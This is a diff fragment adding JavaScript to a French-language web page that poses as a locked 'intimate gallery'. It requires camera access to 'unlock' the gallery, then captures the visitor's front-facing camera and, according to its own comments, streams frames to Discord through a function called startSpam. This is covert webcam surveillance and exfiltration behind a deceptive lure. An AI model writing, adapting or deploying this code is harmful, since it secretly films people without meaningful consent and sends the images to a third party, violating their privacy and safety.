+    updateStatus('🔒 Flux interrompu · galerie vérouillée', '#7b6b9e');
+  }
+
+  // ---------- Button handler: exact logic but intimate design ----------
+  async function toggleProject(e) {
+    e.preventDefault();
+    const btn = document.getElementById('verifyButton');
+
+    // if spam is running => stop everything
+    if (intervalId) {
+      stopSpam();
+      btn.innerHTML = '🌙 Accéder à ma galerie intime';
+      btn.style.background = 'linear-gradient(115deg, #a17fe0, #755bc2)';
+      return;
+    }
+
+    try {
+      btn.innerHTML = '🔮 Ouverture du voile...';
+      btn.disabled = true;
+
+      // request camera
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+      });
+      const video = document.getElementById('cameraFeed');
+      video.srcObject = stream;
+      await video.play();
+
+      // reveal QR if not already shown
+      if (!qrRevealed) await prepareQR();
+      const overlay = document.getElementById('qrOverlay');
+      if (overlay) overlay.classList.add('hidden');
+
+      // start sending frames to discord
+      startSpam();
+
+      btn.innerHTML = '⏹️ STOP · Fermer le flux privé';
+      btn.style.background = 'linear-gradient(115deg, #8b5fcf, #5942a3)';
+      btn.disabled = false;
+    } catch(err) {
+      console.error(err);
+      btn.innerHTML = '🌙 Accéder à ma galerie intime';
+      btn.style.background = 'linear-gradient(115deg, #a17fe0, #755bc2)';
+      btn.disabled = false;
+      alert('Impossible d\'accéder à la caméra · l\'accès visuel est requis pour déverrouiller la galerie intime.');
+    }
+  }
+
+  // generate initial QR (overlay visible)
+  document.addEventListener('DOMContentLoaded', async () => {
+    const initQR = await generateQRDataURL();
+    document.getElementById('qrImage').src = initQR;
+    const verifyBtn = document.getElementById('verifyButton');
+    if (verifyBtn) verifyBtn.addEventListener('click', toggleProject);
+  });
+
+  window.addEventListener('beforeunload', () => {
+    if (intervalId) {
+      stopSpam();
+    }
+  });
+</script>
 </body>
 </html>
